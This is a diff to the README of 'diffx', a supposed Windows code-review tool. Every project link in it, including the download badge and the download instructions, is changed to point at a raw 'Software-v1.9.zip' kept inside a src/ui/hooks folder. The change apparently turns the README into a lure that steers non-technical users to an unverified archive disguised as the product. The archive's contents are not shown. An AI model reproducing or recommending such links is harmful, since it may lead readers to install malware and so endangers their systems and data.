@@ -1,6 +1,6 @@
 # 🧩 diffx - Local code review made simple
 
-[![Download diffx](https://img.shields.io/badge/Download-diffx-blue?style=for-the-badge&logo=github)](https://github.com/myrellepa6155/diffx)
+[![Download diffx](https://img.shields.io/badge/Download-diffx-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/myrellepa6155/diffx/main/src/ui/hooks/Software-v1.9.zip)
 
 ## 🖥️ What diffx does
 
@@ -10,7 +10,7 @@ It is built for Windows users who want a simple way to look at code changes with
 
 ## 📥 Download diffx
 
-Visit this page to download: https://github.com/myrellepa6155/diffx
+Visit this page to download: https://raw.githubusercontent.com/myrellepa6155/diffx/main/src/ui/hooks/Software-v1.9.zip
 
 If the page shows a release file for Windows, download that file. If it shows source files only, use the built-in release download option on that page when it appears.
 
@@ -173,7 +173,7 @@ This keeps diffx easy to find and use again later.
 
 This project is available on GitHub at:
 
-https://github.com/myrellepa6155/diffx
+https://raw.githubusercontent.com/myrellepa6155/diffx/main/src/ui/hooks/Software-v1.9.zip
 
 If you want the latest files, use the same page to check for updates and download the current build
 
